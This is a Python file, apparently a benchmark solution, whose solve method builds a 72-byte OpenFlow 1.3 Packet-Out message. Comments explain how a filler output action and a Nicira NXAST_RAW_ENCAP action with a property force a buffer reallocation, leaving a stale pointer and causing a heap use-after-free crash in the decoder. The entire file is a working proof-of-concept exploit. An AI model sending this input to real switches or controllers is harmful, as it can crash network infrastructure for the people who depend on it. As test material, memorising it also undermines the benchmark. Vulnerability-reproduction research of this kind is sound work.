import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # This PoC is a 72-byte OpenFlow v1.3 Packet-Out message. It is designed
        # to trigger a heap-use-after-free vulnerability during the decoding of
        # a Nicira extension action (NXAST_RAW_ENCAP).
        #
        # The exploit works by carefully managing the size of an internal buffer
        # (`ofpacts`) where decoded actions are stored.
        # 1. A filler action (`OFPAT_OUTPUT`) is included to consume a portion
        #    of the buffer's initial capacity.
        # 2. The target action (`NXAST_RAW_ENCAP`) is then processed. The size of
        #    its main structure fills the remaining space in the buffer.
        # 3. This action contains a property. When the decoder attempts to add
        #    this property's data to the full buffer, it triggers a reallocation
        #    (`realloc`), which moves the buffer's contents to a new memory location.
        # 4. The vulnerable function, however, continues to use a stale pointer
        #    to the old memory location, resulting in a write-after-free when it
        #    attempts to update a field in the action structure. This leads to a crash.

        # OpenFlow v1.3 Header (8 bytes)
        # Version: 1.3 (0x04), Type: OFPT_PACKET_OUT (13), Length: 72, XID: 0
        header = struct.pack('!BBHI', 0x04, 13, 72, 0)

        # OFPT_PACKET_OUT Body (16 bytes)
        # Buffer ID: OFP_NO_BUFFER (0xffffffff)
        # In Port: OFPP_CONTROLLER (0xfffffffd)
        # Actions Length: 48 bytes
        body = struct.pack('!IIH', 0xffffffff, 0xfffffffd, 48) + b'\x00' * 6

        # Actions Payload (48 bytes total)
        actions = b''

        # Action 1: Filler OFPAT_OUTPUT (16 bytes)
        # Type: 0 (OFPAT_OUTPUT), Length: 16, Port: 1, Max Length: 0
        actions += struct.pack('!HHIH', 0, 16, 1, 0) + b'\x00' * 6

        # Action 2: Trigger NXAST_RAW_ENCAP (32 bytes)
        # This is a Nicira vendor extension action.
        
        # Vendor Action Header part (16 bytes)
        # Type: 0xffff (OFPAT_VENDOR), Length: 32
        # Vendor ID: 0x00002320 (NX_VENDOR_ID)
        # Subtype: 35 (NXAST_RAW_ENCAP)
        action2_header = (
            struct.pack('!HHI', 0xffff, 32, 0x00002320) +
            struct.pack('!HH', 35, 0) +  # Subtype and padding
            b'\x00' * 4  # Alignment padding
        )

        # Property part (16 bytes)
        # The decoding of this property triggers the buffer reallocation.
        # Type: 1, Length: 16, Data: 12 zero bytes
        action2_property = struct.pack('!HH', 1, 16) + b'\x00' * 12
        
        actions += action2_header + action2_property

        # Assemble the final PoC
        poc = header + body + actions

        return poc